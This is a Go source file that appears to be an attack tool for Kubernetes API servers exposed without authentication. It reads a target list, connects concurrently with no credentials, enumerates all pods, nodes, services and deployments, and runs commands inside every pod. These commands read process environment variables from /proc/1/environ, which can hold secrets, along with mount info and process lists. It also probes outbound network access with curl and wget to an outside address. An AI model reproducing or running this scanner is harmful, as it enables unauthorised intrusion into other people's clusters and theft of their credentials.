package main

import (
	"bytes"
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/rest"
	"k8s.io/client-go/tools/clientcmd"
	"k8s.io/client-go/tools/remotecommand"
	"log"
	"os"
	"strings"
	"sync"
)

var targetList string
var threads int
var pool = make(chan string, 10)
var poolResult = make(chan string, 10)


func worker(wg *sync.WaitGroup, f func(string) string){
	defer wg.Done()
	for p := range pool{
		r := f(p)
		poolResult <- r
	}
}

type PodList struct {
	PodName string
	NamespaceName string
}

func createWorkerPool(numOfWorkers int, done chan bool, f func(string) string) {
	var wg sync.WaitGroup
	for i := 0; i < numOfWorkers; i++ {
		wg.Add(1)
		go worker(&wg, f)
	}
	wg.Wait()
	close(poolResult)
}

func generateTask(byteContent []byte){
	for _, url :=  range strings.Split(string(byteContent),"\n"){
		pool <- url
	}
	close(pool)
}

func getResult(done chan bool) {
	for result := range poolResult {
		fl, err := os.OpenFile("result.txt", os.O_APPEND|os.O_CREATE, 0644)
		if err != nil {
			continue
		}
		if _, err = fl.Write([]byte(result));err!=nil{
			continue
		}
		if err = fl.Close(); err!=nil{
			continue
		}
	}
	done <- true
}

func MultiApiExec(clientset *kubernetes.Clientset, config *rest.Config, PodName string, NamespaceName string, Command []string) string{
	var ret string
	ret = ""
	//fmt.Println("====================================================")
	ret = ret + "====================================================\n"
	//fmt.Println("[*]EXEXC",PodName, NamespaceName)
	ret = ret + fmt.Sprintf("%s %s %s\n", "[*]EXEXC",PodName, NamespaceName) + "\n"
	reqExec := clientset.CoreV1().RESTClient().Post().
		Resource("pods").
		Name(PodName).
		Namespace(NamespaceName).
		SubResource("exec").
		VersionedParams(&v1.PodExecOptions{
			TypeMeta:  metav1.TypeMeta{},
			Stdin:     true,
			Stdout:    true,
			Stderr:    true,
			TTY:       false,
			Container: "",
			Command:   Command,
		},scheme.ParameterCodec)

	executor, err := remotecommand.NewSPDYExecutor(config, "POST", reqExec.URL())
	if err != nil {
		log.Println(err)
		return ret
	}

	var stdout, stderr bytes.Buffer
	if err = executor.Stream(remotecommand.StreamOptions{
		Stdin:  strings.NewReader(""),
		Stdout: &stdout,
		Stderr: &stderr,
		TerminalSizeQueue: nil,
		Tty:               false,
	}); err != nil {
		log.Println(err)
	}
	ret = ret + stdout.String() + stderr.String()
	return ret
}


func BatchExecK8sApiServer(masterURL string)string{
	var result string
	result = ""

	log.Println(masterURL)
	//podName := "my-nginx-75897978cd-qhclz"
	//podNs := "default"
	config, err := clientcmd.BuildConfigFromFlags(masterURL, "")
	if err != nil{
		log.Println(err)
		return result
	}
	clientset, err := kubernetes.NewForConfig(config)
	if err != nil{
		log.Println(err)
		return result
	}

	pods, err := clientset.CoreV1().Pods("").List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		log.Println(err)
		return result
	}

	nodes, err := clientset.CoreV1().Nodes().List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		log.Println(err)
		return result
	}

	services, err := clientset.CoreV1().Services("").List(context.TODO(), metav1.ListOptions{})
	if err != nil{
		log.Println(err)
		return result
	}

	deployments, err := clientset.AppsV1().Deployments("").List(context.TODO(), metav1.ListOptions{})
	if err != nil{
		log.Println(err)
		return result
	}

	podList := make([]PodList,0)

	// List each Pod (k8s.io/api/core/v1)
	//fmt.Println("====================================================")
	result = result + "====================================================\n"
	for i, pod := range pods.Items {
		//fmt.Printf("Pod %d: %s %s %s\n", i+1, pod.ObjectMeta.Name, pod.ObjectMeta.Namespace, pod.Status.Reason)
		result = result + fmt.Sprintf("Pod %d: %s %s %s\n", i+1, pod.ObjectMeta.Name, pod.ObjectMeta.Namespace, pod.Status.Reason) + "\n"
		podList = append(podList, PodList{
			PodName:       pod.ObjectMeta.Name,
			NamespaceName: pod.ObjectMeta.Namespace,
		})
	}

	//fmt.Println("====================================================")
	result = result + "====================================================\n"
	// List each Node
	for i, node := range nodes.Items{
		//fmt.Printf("Node %d: %s %s\n", i+1, node.ObjectMeta.Name, node.ObjectMeta.Namespace)
		result = result + fmt.Sprintf("Node %d: %s %s\n", i+1, node.ObjectMeta.Name, node.ObjectMeta.Namespace) + "\n"
	}
	//fmt.Println("====================================================")
	result = result + "====================================================\n"
	for i, service := range services.Items{
		//fmt.Printf("Service %d: %s %s\n", i+1 ,service.Name, service.Namespace)
		result = result + fmt.Sprintf("Service %d: %s %s\n", i+1 ,service.Name, service.Namespace) + "\n"
	}
	//fmt.Println("====================================================")
	result = result + "====================================================\n"
	for i, deployment := range deployments.Items{
		//fmt.Printf("Deployment %d: %s %s\n", i+1, deployment.Name, deployment.Namespace)
		result = result + fmt.Sprintf("Deployment %d: %s %s\n", i+1, deployment.Name, deployment.Namespace) + "\n"
	}
	for _,p := range podList{
		var commandResult string
		commandResult = MultiApiExec(clientset,config, p.PodName, p.NamespaceName, []string{"/bin/ls"})
		result =  result + commandResult
		commandResult = MultiApiExec(clientset,config, p.PodName, p.NamespaceName, []string{"/bin/cat", "/proc/1/cmdline"})
		result =  result + commandResult
		commandResult = MultiApiExec(clientset,config, p.PodName, p.NamespaceName, []string{"/bin/cat", "/proc/1/environ"})
		result =  result + commandResult
		commandResult = MultiApiExec(clientset,config, p.PodName, p.NamespaceName, []string{"/bin/cat", "/proc/1/mountinfo"})
		result =  result + commandResult
		commandResult = MultiApiExec(clientset,config, p.PodName, p.NamespaceName, []string{"curl", "114.114.114.114:53", "-vv", "--connect-timeout", "3", "--max-time", "3"})
		result =  result + commandResult
		commandResult = MultiApiExec(clientset,config, p.PodName, p.NamespaceName, []string{"wget", "114.114.114.114:53", "-T", "3", "-t", "1"})
		result =  result + commandResult
		commandResult = MultiApiExec(clientset,config, p.PodName, p.NamespaceName, []string{"ps", "-ef"})
		result =  result + commandResult
	}
	return result
}

func main(){
	flag.StringVar(&targetList,"targets","ip.txt","ip:port 目标列表文件，默认读取本地ip.txt文件")
	flag.IntVar(&threads, "threads", 5, "并发数量")
	//flag.StringVar(&module, "module","helloworld", "功能选择，默认hello world")
	//flag.StringVar(&kubeconfig, "kubeconfig", "", "kubeconfig 配置")
	flag.Parse()
	//fmt.Println(targetList, module)
	byteContent, err := ioutil.ReadFile(targetList)
	if err != nil{
		panic(err)
	}
	//并发
	var done = make(chan bool)
	go getResult(done)
	go generateTask(byteContent)
	go createWorkerPool(threads, done, BatchExecK8sApiServer)

	<- done
}